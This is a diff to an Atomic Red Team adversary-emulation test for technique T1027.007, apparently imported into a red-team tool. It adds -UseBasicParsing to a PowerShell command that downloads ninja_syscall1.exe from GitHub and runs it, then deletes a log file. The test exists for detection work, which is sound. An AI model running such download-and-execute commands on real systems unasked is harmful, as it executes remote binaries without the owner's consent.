@@ -15,11 +15,11 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe"
-          -OutFile "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe"; fi; Start-Process
-          "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe"; Start-Sleep -Seconds
-          7; if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item
-          "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+]
-          hello.log removed." }'
+          -OutFile "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe" -UseBasicParsing;
+          fi; Start-Process "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe";
+          Start-Sleep -Seconds 7; if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log")
+          { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host
+          "[+] hello.log removed." }'
         cleanup: if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") {
           Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host
           "[+] hello.log removed." }
@@ -30,8 +30,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
+  - atomic-red-team
   - t1027.007
   author: Atomic Red Team
   additional_info:
@@ -51,9 +51,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe"
-        -OutFile "#{exe_binary}"
+        -OutFile "#{exe_binary}" -UseBasicParsing
 
         '
     technique_created: '2022-08-22T20:42:08.498Z'
     atomic_guid: 578025d5-faa9-4f6d-8390-aae739d507e1
-    import_timestamp: '2026-10-20T07:08:26.936760Z'
+    import_timestamp: '2026-10-21T07:01:49.665056Z'
